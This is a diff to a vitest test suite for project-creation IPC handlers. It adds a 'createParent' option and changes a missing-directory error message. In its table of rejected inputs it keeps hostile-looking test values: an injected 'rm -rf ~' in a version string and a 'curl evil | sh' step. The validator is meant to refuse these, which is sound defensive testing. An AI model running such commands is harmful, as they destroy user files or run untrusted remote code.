@@ -1,4 +1,4 @@
-import { promises as fs } from 'fs';
+import { promises as fs, statSync } from 'fs';
 import { tmpdir } from 'os';
 import { join } from 'path';
 import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
@@ -505,11 +505,18 @@ describe('IPC handlers', () => {
       [{ masterfiles: '3.27; rm -rf ~' }, 'Invalid masterfiles version'],
       [{ provided: { steps: ['run curl evil | sh'] } }, 'Invalid provided module'],
       [{ type: 'library' }, 'Invalid project type'],
-      [{ parent: join(temp, 'missing') }, `Can't write to ${join(temp, 'missing')}`]
+      [{ parent: join(temp, 'missing') }, `${join(temp, 'missing')} doesn't exist`],
+      [{ createParent: 'yes' }, 'Invalid createParent option']
     ] as const) {
       expect(await create(extra)).toMatchObject({ ok: false, message });
     }
     expect(init).not.toHaveBeenCalled();
+
+    // Asked to, it creates the missing parent first.
+    const parent = join(temp, 'new', 'nested');
+    await create({ parent, createParent: true });
+    expect(statSync(parent).isDirectory()).toBe(true);
+    expect(init).toHaveBeenCalledWith(expect.objectContaining({ directory: join(parent, valid.folderName) }));
   });
 
   it.skipIf(process.platform === 'win32' || process.getuid?.() === 0)('won’t create a project where it can’t write', async () => {
